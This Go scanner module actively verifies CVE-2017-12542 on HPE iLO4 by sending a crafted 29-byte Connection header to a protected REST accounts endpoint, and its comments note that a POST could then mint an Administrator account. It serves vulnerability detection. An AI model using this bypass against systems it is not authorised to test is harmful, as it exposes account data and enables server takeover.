package ilo

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
)

// bypassPath is a credential-protected iLO4 REST resource; unauthenticated it
// returns 401 on healthy firmware.
const bypassPath = "/rest/v1/AccountService/Accounts"

// VerifyAuthBypass actively confirms CVE-2017-12542 on iLO4: the iLO4 web server
// mishandles an HTTP "Connection" header of exactly 29 bytes, dropping the
// session/auth check so an unauthenticated GET to a protected REST endpoint
// returns 200 + JSON (a POST can then mint an Administrator account). This runs a
// differential - the same request without the 29-byte header must be denied -
// so a genuinely pre-auth endpoint cannot produce a false positive. Read-only
// (GET); returns (confirmed, evidence-snippet, error).
func VerifyAuthBypass(host string, timeout time.Duration) (bool, string, error) {
	client := httpx.ClientWithRedirect(timeout, func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	})
	base := "https://" + netaddr.URLAuthority(host) + bypassPath

	// Baseline: no bypass header. Must be denied for the differential to hold.
	baseStatus, _ := iloGet(client, base, "", timeout)
	if baseStatus == 0 {
		return false, "", nil // unreachable
	}
	if baseStatus == http.StatusOK {
		return false, "", nil // endpoint is pre-auth anyway; cannot attribute a bypass
	}

	// Exploit: Connection header of exactly 29 identical bytes.
	status, body := iloGet(client, base, strings.Repeat("A", 29), timeout)
	if status == http.StatusOK && looksLikeILORest(body) {
		return true, fmt.Sprintf(
			"path=%s baselineStatus=%d bypassStatus=%d connectionLen=29 marker=%s bodyBytes=%d",
			bypassPath, baseStatus, status, iloRESTMarker(body), len(body)), nil
	}
	return false, "", nil
}

func iloRESTMarker(body []byte) string {
	s := string(body)
	for _, marker := range []string{"AccountService", "MemberType", "@odata", "links"} {
		if strings.Contains(s, marker) {
			return marker
		}
	}
	return "redfish"
}

// iloGet performs a GET, optionally setting the 29-byte Connection bypass header,
// and returns the status and a bounded body.
func iloGet(client *http.Client, url, connHeader string, timeout time.Duration) (int, []byte) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, nil
	}
	if connHeader != "" {
		// net/http would normalize a real Connection header; set it on the raw
		// header map so the 29-byte value reaches the wire verbatim.
		req.Header["Connection"] = []string{connHeader}
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	return resp.StatusCode, body
}

// looksLikeILORest reports whether a body is a genuine iLO REST/Redfish document
// (not a login page or error stub).
func looksLikeILORest(body []byte) bool {
	s := string(body)
	return strings.Contains(s, "AccountService") ||
		strings.Contains(s, "\"MemberType\"") ||
		strings.Contains(s, "@odata") ||
		(strings.Contains(s, "\"links\"") && strings.Contains(s, "\"Oem\""))
}
